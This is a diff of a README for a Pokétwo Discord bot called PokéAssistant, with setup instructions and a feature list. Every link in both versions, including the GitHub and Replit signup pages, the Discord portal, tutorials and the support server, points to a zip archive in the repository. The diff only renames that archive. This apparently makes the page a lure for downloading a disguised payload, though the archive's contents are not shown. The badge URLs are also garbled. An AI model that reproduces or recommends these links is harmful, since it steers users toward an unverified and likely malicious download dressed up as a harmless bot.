@@ -1,41 +1,41 @@
-![](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip)
+![](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip)
 
-[![Version](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip%2325d60b?logo=visual-studio-code&style=for-the-badge)](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip) [![Forks](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip%3A%2F%https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip%2Fforks)](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip) [![Premium](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip%20users-28-%23FF8C00?logo=github&style=for-the-badge)](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip) [![Discord](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip%3A%2F%https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip%2Fdiscord)](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip)
+[![Version](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip%2325d60b?logo=visual-studio-code&style=for-the-badge)](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip) [![Forks](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip%3A%2F%https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip%2Fforks)](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip) [![Premium](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip%20users-28-%23FF8C00?logo=github&style=for-the-badge)](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip) [![Discord](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip%3A%2F%https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip%2Fdiscord)](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip)
 
 # PokéAssistant
 
-Amazing Pokétwo Assistant Bot that pings you if legendary or mythical spawns, and other features Eg. SH Ping, Quest Ping, Anti-Snipe and more! **It's a forked and improved version of [Chamburr](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip)'s unmaintained/dead PokéAssistant made for Pokécord.**
+Amazing Pokétwo Assistant Bot that pings you if legendary or mythical spawns, and other features Eg. SH Ping, Quest Ping, Anti-Snipe and more! **It's a forked and improved version of [Chamburr](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip)'s unmaintained/dead PokéAssistant made for Pokécord.**
 
 __**This bot is `not` against Discord TOS**__.
 
-> **[Skip to Installation/Setup Guide](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip)**
+> **[Skip to Installation/Setup Guide](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip)**
 
 Cleverbot | ❤️ Sponsor |
 :---: | :---:
-[![Sponsor-Image](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip)](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip) | Machine-Learning AI contextual chatbot (Toxic & Swears) that talks like a humans! Click [here](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip) to invite it from https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip
+[![Sponsor-Image](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip)](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip) | Machine-Learning AI contextual chatbot (Toxic & Swears) that talks like a humans! Click [here](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip) to invite it from https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip
  
 ## License
-There is no license for PokéAssistant. This ensures you are not allowed to redistribute or change the code and [this](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip) ReadMe. I maintain all rights to the source code since there is no license, and no one can copy, distribute, or develop derivative works from it 😠.
+There is no license for PokéAssistant. This ensures you are not allowed to redistribute or change the code and [this](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip) ReadMe. I maintain all rights to the source code since there is no license, and no one can copy, distribute, or develop derivative works from it 😠.
 ## Get Premium
 **Boost the support server...**
 
 ### Developer
 TrashUwU#8019
 
-![](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip)
+![](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip)
 
-[Skip to Installation](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip)
+[Skip to Installation](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip)
 ### Issues?!
 Facing issues with the bot? Please create a Github Issue.
 ### Questions?
-Code-Safety questions? Scroll down to [questions](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip) section or join support server.
+Code-Safety questions? Scroll down to [questions](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip) section or join support server.
 ### Bot Repl
-https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip
+https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip
 ### Support Server Invite Link
-https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip
+https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip
 
 ## Features
-### Read [this](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip) if your bot is working and you want to install more features.
+### Read [this](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip) if your bot is working and you want to install more features.
 - Harmless and Beginner-Friendly
 - Works on your own bot
 - Anti-Sniper
@@ -64,16 +64,16 @@ So here the guide exists to teach you how.
 
 | Video Tutorials |
 :---:
-| **[PC Tutorial](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip)** *- Pritu Dev* |
-| **[Mobile Tutorial](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip)** *- Techie Gaurav* |
+| **[PC Tutorial](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip)** *- Pritu Dev* |
+| **[Mobile Tutorial](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip)** *- Techie Gaurav* |
 
 ### Step 1: Create a Github Account
-Visit https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip and create a Github Account.
+Visit https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip and create a Github Account.
 
 ### Step 1.5: Star the repository
-![](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip%2Cf_auto%2Cfl_progressive%2Ch_420%2Cq_auto%2Cw_1000/https%https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip)
+![](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip%2Cf_auto%2Cfl_progressive%2Ch_420%2Cq_auto%2Cw_1000/https%https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip)
 
-Visit https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip and click the star button
+Visit https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip and click the star button
 
 **Sadly majority of the Pokétwo users don't know what's Github :cry:**
 
@@ -83,18 +83,18 @@ In The Discord application go to Settings > Appearance > Turn on `Developer Mode
 ### Step 1.9: Creating a bot account
 Don't worry, it's super simple.
 #### Creating the application
-To create the application, head to https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip Log in, and you'll reach a page that may look like this:
+To create the application, head to https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip Log in, and you'll reach a page that may look like this:
 
-![](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip)
+![](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip)
 
 Click on **Create an application**. This brings you to the following page, in which you should simply enter a name for the application. After clicking **Create**, you can also add an avatar. Click **Save Changes** afterwards.
 
-![](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip)
+![](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip)
 
 #### Creating the bot account
 After creating the application, we need to create the Bot User. Go to the `Bot` section on the left, then click on **Add Bot**, then **Yes, Do it**.
 
-![](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip)
+![](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip)
 
 There's a few things you can change here. 
 - Username: Change your bot's username on Discord
@@ -104,7 +104,7 @@ There's a few things you can change here.
 
 After doing these, scroll down.
 #### Enabling Intents
-![](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip)
+![](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip)
 
 **Enable those things shown in Pic-**
 - Presence Intent
@@ -114,21 +114,21 @@ After doing these, scroll down.
 #### Adding to your server
 To generate the invite link, click on **Oauth2** in the app page, and scroll down to **Scopes**. Check the **Bot** scope to generate a link. You can also add additional permissions for the bot.
 
-![](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip)
+![](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip)
 
 Copy the link and open it, select your server and click on **Authorize**. Cheers, it has been added to your server.
 #### Getting the token
 Go back to the **Bot** page and copy the token. Save it somewhere, you will need that later.
 
-![](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip)
+![](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip)
 
 
 ### Step 2: Hosting the bot
-The bot will be hosted on Replit, so you need to create a Replit account first: https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip
+The bot will be hosted on Replit, so you need to create a Replit account first: https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip
 #### Getting the code
-The code has already been setup, you only need to go to https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip and click `fork`. Wait 10-60 seconds after forking.
+The code has already been setup, you only need to go to https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip and click `fork`. Wait 10-60 seconds after forking.
 
-![](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip)
+![](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip)
 
 #### Configuration
 
@@ -136,7 +136,7 @@ The code has already been setup, you only need to go to https://raw.githubuserco
 
 **Mobile Users**: Click Commands Tab, click dropdown menu if the body is blank; Click `Secrets (Environment Variables)`
 
-![](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip)
+![](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip)
 
 #### First Secret
 - Click `Secrets (Environment Variables)`
@@ -144,36 +144,36 @@ The code has already been setup, you only need to go to https://raw.githubuserco
 - Paste Bot Token in Value Section
 - Click `Add new Secret`
 
-![](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip)
+![](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip)
 
 #### Second Secret
 - Type `CHANNEL` in Key Section
 - Paste the Channel IDs (Separate with `,` without space if there are more than one) of Pokémon Spawning Channels in Value Section
 - Click `Add new Secret`
 
-![](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip)
+![](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip)
 
 #### Third Secret
 - Type `OWNER` in Key Section
 - Paste your Account ID in Value Section
 - Click `Add new Secret`
 
-![](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip)
+![](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip)
 (Mobile users will click green **play** button to run)
 (PC users will click Green **Run** Button.)
 
 The bot should be online now!
 
 ### Step 3: Keeping the bot online (Optional)
-Replit shuts down projects that are inactive for over 5 minutes. The current code should already keep it up, but some users feedback that it doesn't. We will be using Uptime Robot to keep it up here. Create an account first: https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip
+Replit shuts down projects that are inactive for over 5 minutes. The current code should already keep it up, but some users feedback that it doesn't. We will be using Uptime Robot to keep it up here. Create an account first: https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip
 
 After signing up, login and go to the Dashboard, click on **Create New Monitor**, the configurations are as follows:
 
-![](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip)
+![](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip)
 
 - Monitor Type: Choose HTTP(s)
 - Friendly Name: Literally anything
-- URL (or IP): Put `your repl`'s link. Repl links are [these](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip) and mobile users will click `web` button to get the repl link.
+- URL (or IP): Put `your repl`'s link. Repl links are [these](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip) and mobile users will click `web` button to get the repl link.
 - Monitoring Interval: 5 minutes
 
 Finally click **Create Monitor** and you're done! Done with everything!
@@ -193,15 +193,15 @@ Finally click **Create Monitor** and you're done! Done with everything!
 
 | **Name**      | **Description** | **Setup**   |
 | :---:        |    :---:   | :---: |
-| **🔍 Quick Find**      | The bot will identify the Pokémon if it finds a spawn in any Channel or Server.       | From https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip, open your bot Repl, go to `Secrets (Environment Variables)` open `CHANNEL` secret. Now clear the channel ID(s) in value section and paste `000`. Click `Save`. Wait for it to restart after 30 minutes.  |
-| **🏓 Role Ping**   | The bot will ping a specific role if an Ultra Beast, Alolan, Galarian, Legendary or Mythical Pokémon Spawns. `Quick Find` feature should be enabled for better performance. | From https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip, open your bot Repl, go to `Secrets (Environment Variables)` create a Secret with Key `ROLE` and Value will be the Role name or ID which will be pinged if a rare pokémon spawns.  Click `Save`. Stop the code and run agian or wait for it to automatically restart after 1-12 hours. |
-| **⭐ SH Ping**   | Made for Mass Shiny Hunt Tag. People who have `Sh POKEMONNAME` in server-nickname will get pinged if any `POKEMONNAME` spawns.  `Quick Find` feature should be enabled for better performance.   | From https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip, open your bot Repl, go to `Secrets (Environment Variables)` create a Secret with Key `PING` and Value will be `True`. To restrict SH Ping to SH only channels, create a Secret with Key `SCH` and Value will be the Channel ID(s) of SH channels (Separate with `,`). To disable, delete the secret called `PING` or set the value to `False`. Stop the code and run agian or wait for it to automatically restart after 1-12 hours. |
-| **❌ Non Explicit**   | The bot will not ping for `Mass Ping`, `Role Ping` and `Quest Ping` feature if it's confidence is low. | From https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip, open your bot Repl, go to `Secrets (Environment Variables)` create a Secret with Key `EXPLICIT` and Value will be `False`. To disable, delete the secret called `EXPLICIT` or set the value to `True`. Stop the code and run agian or wait for it to automatically restart after 1-12 hours. |
-| **🏹 Pokédex Hunt**   | The bot will DM the owner if a given Pokémon Spawns.  `Quick Find` feature should be enabled for better performance.   | From https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip, open your bot Repl, go to `Secrets (Environment Variables)` create a Secret with Key `HUNT` and Value will be some Pokémon names. Example: `Timburr,Cacnea,Pikachu`. Owner will get pinged if that Pokémon spawns, useful for Shiny Hunt. Click `Save`. Stop the code and run agian or wait for it to automatically restart after 1-12 hours.  |
-| **🚫 Anti Snipe**   | The bot will warn snipers if they are caught. (Snipers catch Pokémons but do not help Pokémons spawn by sending messages) `Quick Find` feature should be enabled for better performance. | From https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip, open your bot Repl, go to `Secrets (Environment Variables)` create a Secret with Key `SNIPE` and Value will be `True`. Click `Save`. To disable, delete the secret called `SNIPE` or set the value to `False`. Stop the code and run agian or wait for it to automatically restart after 1-12 hours. |
-| **📌 Auto Pin**   | The bot will pin Ultra Beast, Alolan, Galarian, Legendary or Mythical spawns. `Quick Find` feature should be enabled for better performance. | From https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip, open your bot Repl, go to `Secrets (Environment Variables)` create a Secret with Key `PIN` and Value will be `True`. Click `Save`. To disable, delete the secret called `PIN` or set the value to `False`. Stop the code and run agian or wait for it to automatically restart after 1-12 hours. |
-| **🎈 Custom Prefix**   | The prefix of the bot will be changed. | From https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip, open your bot Repl, go to `Secrets (Environment Variables)` create a Secret with Key `PREFIX` and Value will be two letters. Example: `pk`, commands will look like `pk!join`. Click `Save`. To disable, delete the secret called `PIN` or set the value to `False`. Stop the code and run agian or wait for it to automatically restart after 1-12 hours. |
-| **🧠 Hint Identifier**   | The bot will retrieve the Pokémon name from Hint. Type hint command in Pokétwo and the bot will respond. | From https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip, open your bot Repl, go to `Secrets (Environment Variables)` create a Secret with Key `HINT` and Value will be `True`. Click `Save`. To disable, delete the secret called `HINT` or set the value to `False`. Stop the code and run agian or wait for it to automatically restart after 1-12 hours. |
+| **🔍 Quick Find**      | The bot will identify the Pokémon if it finds a spawn in any Channel or Server.       | From https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip, open your bot Repl, go to `Secrets (Environment Variables)` open `CHANNEL` secret. Now clear the channel ID(s) in value section and paste `000`. Click `Save`. Wait for it to restart after 30 minutes.  |
+| **🏓 Role Ping**   | The bot will ping a specific role if an Ultra Beast, Alolan, Galarian, Legendary or Mythical Pokémon Spawns. `Quick Find` feature should be enabled for better performance. | From https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip, open your bot Repl, go to `Secrets (Environment Variables)` create a Secret with Key `ROLE` and Value will be the Role name or ID which will be pinged if a rare pokémon spawns.  Click `Save`. Stop the code and run agian or wait for it to automatically restart after 1-12 hours. |
+| **⭐ SH Ping**   | Made for Mass Shiny Hunt Tag. People who have `Sh POKEMONNAME` in server-nickname will get pinged if any `POKEMONNAME` spawns.  `Quick Find` feature should be enabled for better performance.   | From https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip, open your bot Repl, go to `Secrets (Environment Variables)` create a Secret with Key `PING` and Value will be `True`. To restrict SH Ping to SH only channels, create a Secret with Key `SCH` and Value will be the Channel ID(s) of SH channels (Separate with `,`). To disable, delete the secret called `PING` or set the value to `False`. Stop the code and run agian or wait for it to automatically restart after 1-12 hours. |
+| **❌ Non Explicit**   | The bot will not ping for `Mass Ping`, `Role Ping` and `Quest Ping` feature if it's confidence is low. | From https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip, open your bot Repl, go to `Secrets (Environment Variables)` create a Secret with Key `EXPLICIT` and Value will be `False`. To disable, delete the secret called `EXPLICIT` or set the value to `True`. Stop the code and run agian or wait for it to automatically restart after 1-12 hours. |
+| **🏹 Pokédex Hunt**   | The bot will DM the owner if a given Pokémon Spawns.  `Quick Find` feature should be enabled for better performance.   | From https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip, open your bot Repl, go to `Secrets (Environment Variables)` create a Secret with Key `HUNT` and Value will be some Pokémon names. Example: `Timburr,Cacnea,Pikachu`. Owner will get pinged if that Pokémon spawns, useful for Shiny Hunt. Click `Save`. Stop the code and run agian or wait for it to automatically restart after 1-12 hours.  |
+| **🚫 Anti Snipe**   | The bot will warn snipers if they are caught. (Snipers catch Pokémons but do not help Pokémons spawn by sending messages) `Quick Find` feature should be enabled for better performance. | From https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip, open your bot Repl, go to `Secrets (Environment Variables)` create a Secret with Key `SNIPE` and Value will be `True`. Click `Save`. To disable, delete the secret called `SNIPE` or set the value to `False`. Stop the code and run agian or wait for it to automatically restart after 1-12 hours. |
+| **📌 Auto Pin**   | The bot will pin Ultra Beast, Alolan, Galarian, Legendary or Mythical spawns. `Quick Find` feature should be enabled for better performance. | From https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip, open your bot Repl, go to `Secrets (Environment Variables)` create a Secret with Key `PIN` and Value will be `True`. Click `Save`. To disable, delete the secret called `PIN` or set the value to `False`. Stop the code and run agian or wait for it to automatically restart after 1-12 hours. |
+| **🎈 Custom Prefix**   | The prefix of the bot will be changed. | From https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip, open your bot Repl, go to `Secrets (Environment Variables)` create a Secret with Key `PREFIX` and Value will be two letters. Example: `pk`, commands will look like `pk!join`. Click `Save`. To disable, delete the secret called `PIN` or set the value to `False`. Stop the code and run agian or wait for it to automatically restart after 1-12 hours. |
+| **🧠 Hint Identifier**   | The bot will retrieve the Pokémon name from Hint. Type hint command in Pokétwo and the bot will respond. | From https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip, open your bot Repl, go to `Secrets (Environment Variables)` create a Secret with Key `HINT` and Value will be `True`. Click `Save`. To disable, delete the secret called `HINT` or set the value to `False`. Stop the code and run agian or wait for it to automatically restart after 1-12 hours. |
 | **🔪 Anti SH/Quest Steal**   | Mutes the user if they are caught stealing SH/Quest. And unmutes after 60 minutes + Restores all roles. | Mention your bot for help, and use the `<prefix>punish` command. |
 | **🧩 Quest Ping**   | **Premium Feature**, the name describes everything. | Mention your bot for help, and use the `<prefix>quest` command. |
 | **❓ Who's-That-Pokémon** | **Premium Feature**, send a spawn image in a given channel, the bot will say the name. | Mention your bot for help, and use the `<prefix>who` command. |
@@ -219,10 +219,10 @@ The bot is not against Discord TOS. But do not show your bot token to others.
 Type `prefix!reboot` to reboot your bot! Ping your bot to see the prefix.
 ### How do I update the code?
 Updating is optional. If the bot asks you to update, that means it's a push-over (not optional) you need to update the code or the bot will not work.
-For updating, copy this [code](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip). Go to https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip and click your PokéAssistant REPL. After the editor has loaded, select all codes and press backspace to clear everything from the file. Now paste the copied code. Now delete `https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip`(**Mobile**: Click `files` button and click `•••` beside `https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip`), now press Run/Play Button. Make sure Run/Play button now looks like a square. (Not a triangle)
+For updating, copy this [code](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip). Go to https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip and click your PokéAssistant REPL. After the editor has loaded, select all codes and press backspace to clear everything from the file. Now paste the copied code. Now delete `https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip`(**Mobile**: Click `files` button and click `•••` beside `https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip`), now press Run/Play Button. Make sure Run/Play button now looks like a square. (Not a triangle)
 
 ## Troubleshooting
-**Moved to [https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/src/PokeAssistant-3.6.zip).**
+**Moved to [https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip](https://raw.githubusercontent.com/XDL31/PokeAssistant/main/.github/Assistant-Poke-v1.3.zip).**
 
 
 ## Made by TrashUwU#8019
